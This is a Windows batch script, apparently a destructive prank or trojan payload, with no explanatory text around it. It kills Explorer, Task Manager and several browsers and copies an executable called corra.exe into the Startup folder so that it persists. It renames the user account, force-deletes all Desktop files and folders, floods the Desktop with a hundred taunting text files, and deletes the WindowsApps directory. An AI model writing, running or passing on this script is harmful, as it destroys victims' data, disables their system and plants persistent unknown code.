@echo off
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
taskkill /f /im chrome.exe
taskkill /f /im iexplorer.exe
taskkill /f /im firefox.exe
taskkill /f /im opera.exe
copy %temp%\corra.exe "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\corra.exe
"

wmic useraccount where name='%username%' set FullName='i like u'
wmic useraccount where name='%username%' rename 'i like u'
SET /a cr=0

del /f /s /q %userprofile%\Desktop\*
for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"

:l
copy %temp%\txt.txt "%userprofile%\Desktop\O PROXIMO O PROXIMO O PROXIMO O PROXIMO O PROXIMO O PROX%cr%IMO.txt"
SET /a cr=%cr%+1
if %cr%==28 copy %temp%\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf %userprofile%\Desktop\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf
if not %cr%==100 goto l

del /f /s /q "C:\Program Files\WindowsApps\"
